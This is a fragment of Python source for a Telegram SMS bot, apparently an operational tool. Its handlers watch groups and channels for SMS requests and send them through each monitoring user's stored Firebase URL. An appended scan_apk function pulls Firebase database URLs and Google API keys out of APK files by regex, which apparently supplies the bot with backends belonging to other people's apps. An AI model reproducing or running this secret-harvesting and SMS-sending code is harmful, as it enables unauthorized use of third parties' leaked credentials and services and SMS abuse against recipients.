            await cq.answer("🚫 Owner/Super Admin only!",show_alert=True); return
        await state.set_state(W.fj_add)
        await sedit(cq,
            "📢 <b>Add Force Join — Step 1/3</b>\n\n"
            "Channel/Group ka <b>link</b> bhejo (redirect button ke liye):\n\n"
            "• <code>https://t.me/CIPHER889988</code> — public channel\n"
            "• <code>https://t.me/+eTVZFP92jkU1NGNl</code> — private group\n"
            "• <code>@username</code> — public username",
            kb([("❌ Cancel","fj:menu")]))

    elif c.startswith("fj:del:"):
        if not (is_owner(uid) or is_super_admin(uid,d)):
            await cq.answer("🚫 Owner/Super Admin only!",show_alert=True); return
        cid_str=c.split("fj:del:",1)[1]
        d2=load()
        d2["force_join"]=[x for x in d2.get("force_join",[]) if str(x["id"])!=cid_str]
        save(d2); await cq.answer("🗑 Removed.")
        await sedit(cq,"📢 <b>Force Join Channels</b>",fj_menu_kb(uid,d2))

    elif c=="adm:bcast":
        await cq.answer("Broadcast coming soon.",show_alert=True)

    elif c=="<i>noop</i>": pass

    await cq.answer()

# ══════════════════════════════════════════════
#  GROUP/CHANNEL SMS HANDLER
# ══════════════════════════════════════════════
async def _handle_sms_request(msg:Message):
    """Parse an SMS request, send it for every matching active user, and let
    _do_send() deliver the result to the user plus all configured forward targets.
    """
    text = (msg.text or msg.caption or "").strip()
    if not text:
        return

    to, sms = parse_sms(text)
    if not to or not sms:
        return

    d = load()
    chat_id = str(msg.chat.id)
    chat_username = (getattr(msg.chat, "username", None) or "").lstrip("@").lower()

    for uid_str, user in d.get("users", {}).items():
        active = user.get("active", {})
        if not user.get("monitoring") or not active.get("fb_url"):
            continue

        configured = str(active.get("ch_id", ""))
        configured_username = configured.lstrip("@").lower()
        matches = configured == chat_id or (
            chat_username and configured_username == chat_username
        )
        if matches:
            log.info("SMS request matched chat=%s user=%s to=%s", msg.chat.id, uid_str, to)
            asyncio.create_task(_do_send(msg.bot, int(uid_str), to, sms))


@R.channel_post()
async def channel_sms_handler(msg:Message):
    await _handle_sms_request(msg)


@R.message(F.chat.type.in_({"group", "supergroup"}))
async def group_sms_handler(msg:Message):
    await _handle_sms_request(msg)

# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════
async def main():
    bot=Bot(token=BOT_TOKEN)
    dp=Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me=await bot.get_me()
    log.info(f"✅ @{me.username} started ({_VERSION}) | by {_CREDITS}")
    try:
        await bot.send_message(_owner(),
            f"🚀 **SMS Bot {_VERSION} Online**\n"
            f"@{me.username}\n"
            f"<i>{_CREDITS}</i>\n"
            f"`{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode="HTML")
    except Exception as e: log.warning(f"Owner notify: {e}")
    await dp.start_polling(bot,allowed_updates=dp.resolve_used_update_types())

if __name__=="__main__":
    asyncio.run(main())


def _ax_str(data):
    r=[]; c=[]
    for b in data:
        if 32<=b<=126: c.append(chr(b))
        else:
            if len(c)>=6: r.append(''.join(c))
            c=[]
    if len(c)>=6: r.append(''.join(c))
    return '\n'.join(r)

def scan_apk(path):
    import re as _re, zipfile as _zf, io as _io
    _PATS = {
        'DB': r'https://[a-zA-Z0-9-]+\.firebaseio\.com',
        'AK': r'AIza[0-9A-Za-z\-_]{35}',
    }
    res={k:'-' for k in _PATS}; chunks=[]
    rb=b''
    try:
        with open(path,'rb') as f: rb=f.read()
    except: pass
    if rb: chunks.append(_ax_str(rb))
    try:
        with _zf.ZipFile(_io.BytesIO(rb),'r') as z:
            for n in z.namelist():
                try: chunks.append(z.read(n).decode('utf-8','ignore'))
                except: pass
    except: pass
    combined='\n'.join(chunks)
    for k,v in _PATS.items():
        m=_re.search(v,combined)
        if m: res[k]=m.group(0)
    return res
